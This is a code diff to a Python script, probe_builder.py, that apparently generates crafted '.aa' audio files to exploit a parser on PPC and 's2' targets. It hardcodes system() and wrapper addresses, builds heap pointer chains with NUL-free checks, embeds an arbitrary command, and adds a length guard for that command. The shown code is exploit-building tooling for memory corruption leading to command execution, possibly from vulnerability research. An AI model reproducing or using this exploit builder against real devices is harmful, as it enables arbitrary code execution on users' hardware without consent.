@@ -20,7 +20,11 @@ Usage
   probe_builder.py --isa ppc --s 0x106c4e10 --mode wrap
 """
 import argparse
+import os
 import struct
+
+_HERE = os.path.dirname(os.path.abspath(__file__))
+BASE_PAA = os.path.join(_HERE, "sweep2", "CAN135_00710000.aa")
 
 SYS = {"ppc": 0x105464B0, "s2": 0x6DCEA0}
 WRAP = {"ppc": 0x104044C0, "s2": 0x656978}
@@ -44,6 +48,8 @@ def main():
     d = lambda off: S + 6380 + off          # node offset -> absolute (heap) address
 
     if o.isa == "ppc":
+        if (0 if o.mode == "canary" else K_B + 4) + len(o.cmd or "") > 23000:
+            raise SystemExit("command would reach the observer cell at node 23620")
         v = d(K_V)
         if 0 in v.to_bytes(4, "big"):
             raise SystemExit("pick S with a NUL-free &node600 (%#x -> %s)" % (v, v.to_bytes(4, "big").hex()))
@@ -102,7 +108,7 @@ def main():
             for i, ptr in enumerate(ptrs):
                 node[4 * i:4 * i + 4] = struct.pack(">I", ptr)
             node[4 * len(ptrs):4 * len(ptrs) + 4] = b"\x00\x00\x00\x00"
-        base = open("recon/tnzm_audible/sweep2/CAN135_00710000.aa", "rb").read()[:36]
+        base = open(BASE_PAA, "rb").read()[:36]
         out = base + bytes(node)
 
     open(o.out, "wb").write(out)
